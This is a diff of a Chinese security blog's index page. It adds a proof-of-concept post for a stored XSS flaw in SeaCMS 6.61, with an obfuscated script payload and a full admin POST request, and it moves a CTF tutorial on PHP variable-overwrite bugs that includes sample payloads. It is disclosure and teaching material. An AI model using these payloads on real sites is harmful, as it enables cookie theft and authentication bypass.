@@ -197,7 +197,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Google-hacking/" style="font-size: 10px;">Google hacking</a> <a href="/tags/MSF/" style="font-size: 10px;">MSF</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/关于我/" style="font-size: 10px;">关于我</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/学习历程/" style="font-size: 10px;">学习历程</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/技术/" style="font-size: 20px;">技术</a> <a href="/tags/文件解析/" style="font-size: 10px;">文件解析</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
+                        <a href="/tags/Google-hacking/" style="font-size: 10px;">Google hacking</a> <a href="/tags/MSF/" style="font-size: 10px;">MSF</a> <a href="/tags/SQL注入/" style="font-size: 10px;">SQL注入</a> <a href="/tags/Seacms/" style="font-size: 10px;">Seacms</a> <a href="/tags/ctf/" style="font-size: 16.67px;">ctf</a> <a href="/tags/python/" style="font-size: 13.33px;">python</a> <a href="/tags/web/" style="font-size: 13.33px;">web</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/代码审计/" style="font-size: 10px;">代码审计</a> <a href="/tags/关于我/" style="font-size: 10px;">关于我</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/学习历程/" style="font-size: 10px;">学习历程</a> <a href="/tags/密码学/" style="font-size: 10px;">密码学</a> <a href="/tags/技术/" style="font-size: 20px;">技术</a> <a href="/tags/文件解析/" style="font-size: 10px;">文件解析</a> <a href="/tags/正则表达式/" style="font-size: 10px;">正则表达式</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a>
                     </div>
                 </section>
                 
@@ -331,6 +331,73 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-seacms6.61xss" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/07/25/seacms6.61xss/" class="article-date">
+      <time datetime="2018-07-25T03:35:12.000Z" itemprop="datePublished">2018-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/07/25/seacms6.61xss/">Seacms6.61xss漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php"><a href="#Seacms-V6-61-has-XSS-vulnerability-in-site-name-parameter-of-admin-video-php" class="headerlink" title="Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php"></a>Seacms V6.61 has XSS vulnerability in site name parameter of admin_video.php</h3><h4 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h4><p>Seacms 6.61  </p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details/open/ontoggle=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(100)+String.fromCharCode(111)+String.fromCharCode(99)+String.fromCharCode(117)+String.fromCharCode(109)+String.fromCharCode(101)+String.fromCharCode(110)+String.fromCharCode(116)+String.fromCharCode(46)+String.fromCharCode(99)+String.fromCharCode(111)+String.fromCharCode(111)+String.fromCharCode(107)+String.fromCharCode(105)+String.fromCharCode(101)+String.fromCharCode(41))&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>POST /ADMIN/admin_video.php?action=save&amp;acttype=add HTTP/1.1<br>Host: cms.jas0nwhy.top<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Referer: <a href="http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add" target="_blank" rel="noopener">http://cms.jas0nwhy.top/ADMIN/admin_video.php?action=add</a><br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 1354<br>Cookie: PHPSESSID=8k4mkaq9l3ps7dcrcvafetelt6; HISTORY={video:[{“name”:”123”,”link”:”<a href="http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(xss)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(document.cookie)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;}]}" target="_blank" rel="noopener">http://cms.jas0nwhy.top/detail/?8.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(xss)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?1.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;},{&quot;name&quot;:&quot;&amp;lt\u003bscript&amp;gt\u003balert(document.cookie)&amp;lt\u003b/script&amp;gt\u003b&quot;,&quot;link&quot;:&quot;http://cms.jas0nwhy.top/detail/?5.html&quot;,&quot;pic&quot;:&quot;/pic/nopic.gif&quot;}]}</a><br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1</p>
+<p>v_commend=0&amp;v_name=test&amp;v_enname=test&amp;v_color=&amp;v_type=5&amp;v_state=&amp;v_pic=&amp;v_spic=&amp;v_gpic=&amp;v_actor=&amp;v_director=&amp;v_commend=0&amp;v_note=&amp;v_tags=&amp;select3=&amp;v_publishyear=&amp;select2=&amp;v_lang=&amp;select1=&amp;v_publisharea=&amp;select4=&amp;v_ver=&amp;v_hit=0&amp;v_monthhit=0&amp;v_weekhit=0&amp;v_dayhit=0&amp;v_len=&amp;v_total=&amp;v_nickname=&amp;v_company=&amp;v_tvs=&amp;v_douban=&amp;v_mtime=&amp;v_imdb=&amp;v_score=&amp;v_scorenum=&amp;v_longtxt=&amp;v_money=0&amp;v_psd=123&amp;v_playfrom%5B1%5D=%E7%BD%91%E7%9B%98%E4%B8%8B%E8%BD%BD&amp;v_playurl%5B1%5D=test&amp;m_downfrom%5B1%5D=%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80%E4%B8%80&amp;m_downurl%5B1%5D=test&amp;v_content=%3Ccode%3E%26lt%3Bdetails%2Fopen%2Fontoggle%3Deval%28String.fromCharCode%2897%29%2BString.fromCharCode%28108%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28114%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2840%29%2BString.fromCharCode%28100%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28117%29%2BString.fromCharCode%28109%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%28110%29%2BString.fromCharCode%28116%29%2BString.fromCharCode%2846%29%2BString.fromCharCode%2899%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28111%29%2BString.fromCharCode%28107%29%2BString.fromCharCode%28105%29%2BString.fromCharCode%28101%29%2BString.fromCharCode%2841%29%29%26gt%3B%3C%2Fcode%3E&amp;Submit=%E7%A1%AE%E5%AE%9A%E6%8F%90%E4%BA%A4<br>```</p>
+<h4 id="vulnerability-trigger-point"><a href="#vulnerability-trigger-point" class="headerlink" title="vulnerability trigger point"></a>vulnerability trigger point</h4><p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms1.JPG?raw=true" alt="image">  </p>
+<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms2.JPG?raw=true" alt="image">  </p>
+<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms3.JPG?raw=true" alt="image"></p>
+<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms4.JPG?raw=true" alt="image">  </p>
+<p><img src="https://github.com/Jas0nwhy/vulnerability/blob/master/seacms5.jpg?raw=true" alt="image"></p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Seacms/">Seacms</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-hash长度扩展攻击(1)" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -763,79 +830,6 @@ D=0xf6b42726
 
 
   
-    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/05/14/变量覆盖漏洞/" class="article-date">
-      <time datetime="2018-05-14T03:35:12.000Z" itemprop="datePublished">2018-05-14</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/05/14/变量覆盖漏洞/">变量覆盖漏洞</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值<br><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">推荐阅读代码审计|变量覆盖漏洞 </a>  </p>
-<h5 id="1-exartact函数"><a href="#1-exartact函数" class="headerlink" title="1.exartact函数"></a>1.exartact函数</h5><p>exartact（）函数的作用是从传入数组中将变量导入当前符号表中，键名是变量名，键值是变量值。</p>
-<p>注：符号表是记录符号属性的表,它的每一表项表示一个标识符的属性信息.这些属性信息通常包括种类(常数,变量,数组,标号等),类型(整型,实型,逻辑型,字符型等),给名字分配的存储单元地址等。  </p>
-<p>该函数有三个参数var_array（必须，规定输入）、extract_type（可选，检查每个键名是否为合法变量）、prefix</p>
-<p>该函数出现变量覆盖漏洞通常有两种情况：<br>（1）二参为EXTR_OVERWRITE,它表示有冲突时覆盖已有变量<br>（2）只有一参，默认二参为EXTR_OVERWRITE</p>
-<p>这道变量覆盖的ctf题中，extract函数是获取post传参后的以数组形式传入符号表，我们post传入pass=0&amp;thepassword_123=0，将thepassword_123变量值赋值为0</p>
-<h5 id="2-parse-str函数"><a href="#2-parse-str函数" class="headerlink" title="2.parse_str函数"></a>2.parse_str函数</h5><p>该函数作用是解析字符串并且注册成变量，在注册变量之前不会验证变量是否已经存在，直接覆盖<br>语法：<br>parse_str(string,array)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=1;</span><br><span class="line">parse_str(&apos;b=2&apos;);</span><br><span class="line">print_r(%$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>输出的b的值变为了2  </p>
-<p>例：某ctf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $id = $_GET[&apos;id&apos;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line">   echo $flag;</span><br><span class="line">PAYLOAD： ?id=a[0]=240610708</span><br></pre></td></tr></table></figure></p>
-<h5 id="3-import-request-variables函数"><a href="#3-import-request-variables函数" class="headerlink" title="3.import_request_variables函数"></a>3.import_request_variables函数</h5><p>该函数是把GET,POST,COOKIE的参数注册为变量，用在register_globals被禁止的时候<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure></p>
-<p>　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀<br>　　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    //原变量值为1</span><br><span class="line">import_request_variables(&apos;GP&apos;);   //传入参数时注册变量</span><br><span class="line">print_r($a);  //输出结果为2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h5 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="4.$$变量覆盖"></a>4.$$变量覆盖</h5><p>$$常常用在foreach函数中<br>例：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//?name=test</span><br><span class="line"></span><br><span class="line">//output:string(4) “name” string(4) “test” string(4) “test” test</span><br><span class="line"></span><br><span class="line">$name=’thinking’;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line"></span><br><span class="line">$$key = $value;#$key=name,$$key=$name</span><br><span class="line"></span><br><span class="line">var_dump($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump($value);</span><br><span class="line"></span><br><span class="line">var_dump($$key);</span><br><span class="line"></span><br><span class="line">echo $name;#会输出test</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>foreach函数将get参数存入数组，我们构造payload：<strong>index.php?name=meizijiu233</strong>，name作为变量存入，$$key=$name=meizijiu233；判断通过</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
     <article id="post-iscc ctf题小记(1)" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -971,6 +965,79 @@ D=0xf6b42726
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/14/变量覆盖漏洞/" class="article-date">
+      <time datetime="2018-05-14T03:35:12.000Z" itemprop="datePublished">2018-05-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/14/变量覆盖漏洞/">变量覆盖漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值<br><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">推荐阅读代码审计|变量覆盖漏洞 </a>  </p>
+<h5 id="1-exartact函数"><a href="#1-exartact函数" class="headerlink" title="1.exartact函数"></a>1.exartact函数</h5><p>exartact（）函数的作用是从传入数组中将变量导入当前符号表中，键名是变量名，键值是变量值。</p>
+<p>注：符号表是记录符号属性的表,它的每一表项表示一个标识符的属性信息.这些属性信息通常包括种类(常数,变量,数组,标号等),类型(整型,实型,逻辑型,字符型等),给名字分配的存储单元地址等。  </p>
+<p>该函数有三个参数var_array（必须，规定输入）、extract_type（可选，检查每个键名是否为合法变量）、prefix</p>
+<p>该函数出现变量覆盖漏洞通常有两种情况：<br>（1）二参为EXTR_OVERWRITE,它表示有冲突时覆盖已有变量<br>（2）只有一参，默认二参为EXTR_OVERWRITE</p>
+<p>这道变量覆盖的ctf题中，extract函数是获取post传参后的以数组形式传入符号表，我们post传入pass=0&amp;thepassword_123=0，将thepassword_123变量值赋值为0</p>
+<h5 id="2-parse-str函数"><a href="#2-parse-str函数" class="headerlink" title="2.parse_str函数"></a>2.parse_str函数</h5><p>该函数作用是解析字符串并且注册成变量，在注册变量之前不会验证变量是否已经存在，直接覆盖<br>语法：<br>parse_str(string,array)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=1;</span><br><span class="line">parse_str(&apos;b=2&apos;);</span><br><span class="line">print_r(%$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出的b的值变为了2  </p>
+<p>例：某ctf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $id = $_GET[&apos;id&apos;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line">   echo $flag;</span><br><span class="line">PAYLOAD： ?id=a[0]=240610708</span><br></pre></td></tr></table></figure></p>
+<h5 id="3-import-request-variables函数"><a href="#3-import-request-variables函数" class="headerlink" title="3.import_request_variables函数"></a>3.import_request_variables函数</h5><p>该函数是把GET,POST,COOKIE的参数注册为变量，用在register_globals被禁止的时候<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure></p>
+<p>　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀<br>　　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    //原变量值为1</span><br><span class="line">import_request_variables(&apos;GP&apos;);   //传入参数时注册变量</span><br><span class="line">print_r($a);  //输出结果为2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<h5 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="4.$$变量覆盖"></a>4.$$变量覆盖</h5><p>$$常常用在foreach函数中<br>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//?name=test</span><br><span class="line"></span><br><span class="line">//output:string(4) “name” string(4) “test” string(4) “test” test</span><br><span class="line"></span><br><span class="line">$name=’thinking’;</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line"></span><br><span class="line">$$key = $value;#$key=name,$$key=$name</span><br><span class="line"></span><br><span class="line">var_dump($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump($value);</span><br><span class="line"></span><br><span class="line">var_dump($$key);</span><br><span class="line"></span><br><span class="line">echo $name;#会输出test</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>foreach函数将get参数存入数组，我们构造payload：<strong>index.php?name=meizijiu233</strong>，name作为变量存入，$$key=$name=meizijiu233；判断通过</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
     </div>
 
       
@@ -1271,104 +1338,6 @@ D=0xf6b42726
 <h6 id="7-1"><a href="#7-1" class="headerlink" title="7."></a>7.</h6><p>方法就是与实例绑定的函数，和普通函数不同，方法可以直接访问实例的数据</p>
 <h6 id="8-1"><a href="#8-1" class="headerlink" title="8."></a>8.</h6><p>在面向对象的程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class），对于前面的类，括号里面的object就是他们的父类，子类继承父类全部功能<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fpmvkggipfj30k90but8p.jpg" alt="image"></p>
 <h6 id="9-1"><a href="#9-1" class="headerlink" title="9."></a>9.</h6><p>加强记忆，一种类的实例可以应用这个类里面的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Timer(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos; Timer is  Start...&apos;)</span><br><span class="line">dog=Timer()</span><br><span class="line">dog.run()   #实例dog应用了Timer类中的Run函数</span><br></pre></td></tr></table></figure></p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-python：requests模块介绍" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/03/23/python：requests模块介绍/" class="article-date">
-      <time datetime="2018-03-23T09:02:50.381Z" itemprop="datePublished">2018-03-23</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/23/python：requests模块介绍/">python：requests模块介绍</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p>使用 Requests 发送网络请求非常简单。<br>一开始要导入 Requests 模块：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import requests</span><br></pre></td></tr></table></figure></p>
-<p>然后，尝试获取某个网页。本例子中，我们来获取 Github 的公共时间线：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;r= requests.get(&apos;https://github.com/timeline.json&apos;)</span><br></pre></td></tr></table></figure></p>
-<p>现在，我们有一个名为 r 的 Response 对象。我们可以从这个对象中获取所有我们想要的信息。<br>Requests 简便的 API 意味着所有 HTTP 请求类型都是显而易见的。例如，你可以这样发送一个 HTTP POST 请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;)</span><br></pre></td></tr></table></figure></p>
-<p>漂亮，对吧？那么其他 HTTP 请求类型：PUT，DELETE，HEAD 以及 OPTIONS 又是如何的呢？都是一样的简单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; r = requests.put(&quot;http://httpbin.org/put&quot;)  </span><br><span class="line">&gt;&gt;&gt; r = requests.delete(&quot;http://httpbin.org/delete&quot;)  </span><br><span class="line">&gt;&gt;&gt; r = requests.head(&quot;http://httpbin.org/get&quot;)  </span><br><span class="line">&gt;&gt;&gt; r = requests.options(&quot;http://httpbin.org/get&quot;)</span><br></pre></td></tr></table></figure></p>
-<p>都很不错吧，但这也仅是 Requests 的冰山一角呢。</p>
-<h2 id="传递-URL-参数"><a href="#传递-URL-参数" class="headerlink" title="传递 URL 参数"></a>传递 URL 参数</h2><p>你也许经常想为 URL 的查询字符串(query string)传递某种数据。如果你是手工构建 URL，那么数据会以键/值对的形式置于 URL 中，跟在一个问号的后面。例如， httpbin.org/get?key=val。 Requests 允许你使用 params 关键字参数，以一个字符串字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload = &#123;&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;&#125;  </span><br><span class="line">&gt;&gt;&gt; r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)</span><br></pre></td></tr></table></figure></p>
-<p>通过打印输出该 URL，你能看到 URL 已被正确编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(r.url)  </span><br><span class="line">http://httpbin.org/get?key2=value2&amp;key1=value1</span><br></pre></td></tr></table></figure></p>
-<p>注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。<br>你还可以将一个列表作为值传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; payload = &#123;&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: [&apos;value2&apos;, &apos;value3&apos;]&#125;  </span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; r = requests.get(&apos;http://httpbin.org/get&apos;,params=payload)</span><br><span class="line">&gt; print(r.url)  </span><br><span class="line">http://httpbin.org/get?key1=value1&amp;key2=value2&amp;key2=value3</span><br></pre></td></tr></table></figure></p>
